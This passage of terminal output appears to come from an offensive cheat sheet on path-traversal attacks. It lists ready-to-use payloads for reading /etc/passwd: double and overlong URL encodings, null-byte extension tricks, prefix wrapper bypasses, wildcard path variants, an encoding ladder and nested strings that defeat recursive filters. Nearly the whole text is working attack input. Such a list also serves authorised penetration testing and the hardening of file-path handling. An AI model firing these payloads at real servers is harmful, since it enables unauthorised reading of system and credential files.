[34m│[0m %252e%252e%252f (double encode)                                              [34m│[0m
[34m│[0m ..%c0%af (UTF-8 overlong)                                                    [34m│[0m
[34m│[0m ....\/....\ (mixed bypass)                                                   [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Wrapper Bypass                                                           [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **If path MUST start with /uploads/:**                                       [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m /uploads/../../../etc/passwd                                                 [34m│[0m
[34m│[0m /uploads/..%2f..%2f..%2fetc/passwd                                           [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **If extension MUST be .jpg:**                                               [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ../../../etc/passwd%00.jpg (null byte - old)                                 [34m│[0m
[34m│[0m ../../../etc/passwd/.jpg (path confusion)                                    [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Null Byte Injection                                                      [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m Pattern               │ Effect                                               [34m│[0m
[34m│[0m ──────────────────────┼────────────────────────────────────────────          [34m│[0m
[34m│[0m file.php%00.jpg       │ C-based filter sees .jpg, PHP sees .php              [34m│[0m
[34m│[0m ../../../etc/passwd%00│ Truncates appended extension                         [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Path Alternatives                                                        [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m /etc/passwd                   → /e?c/p?ss??                                  [34m│[0m
[34m│[0m                               → /e*c/p*d                                     [34m│[0m
[34m│[0m                               → ././etc/./passwd                             [34m│[0m
[34m│[0m                               → /etc//passwd                                 [34m│[0m
[34m│[0m                               → /etc/passwd/.                                [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Encoding Ladder for Path Traversal                                       [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ENCODING LADDER (apply progressively):                                       [34m│[0m
[34m│[0m ───────────────────────────────────────────────────────────────────          [34m│[0m
[34m│[0m Raw          │ ../etc/passwd                                                 [34m│[0m
[34m│[0m URL          │ ..%2Fetc%2Fpasswd                                             [34m│[0m
[34m│[0m Double-URL   │ ..%252F...                                                    [34m│[0m
[34m│[0m Unicode      │ \u002e\u002e/                                                 [34m│[0m
[34m│[0m UTF-8 Overlong│ %c0%ae (for .)                                               [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **KEY INSIGHT:** Filters decode at one layer, execution happens at another.  [34m│[0m
[34m│[0m - If filter checks URL-decoded but backend double-decodes → double-encode    [34m│[0m
[34m│[0m - If filter checks raw but backend URL-decodes → URL-encode                  [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Recursive Filter Testing                                                 [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m IF FILTER REMOVES DANGEROUS STRINGS:                                         [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m Input:  ../                                                                  [34m│[0m
[34m│[0m Output: (empty) - ".." removed                                               [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m Try:    ....//                                                               [34m│[0m
[34m│[0m After:  ../ - nested payload survives!                                       [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m TRY THESE PATTERNS:                                                          [34m│[0m
[34m│[0m ....//              → becomes ../                                            [34m│[0m
[34m│[0m ..../..../          → multi-layer                                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
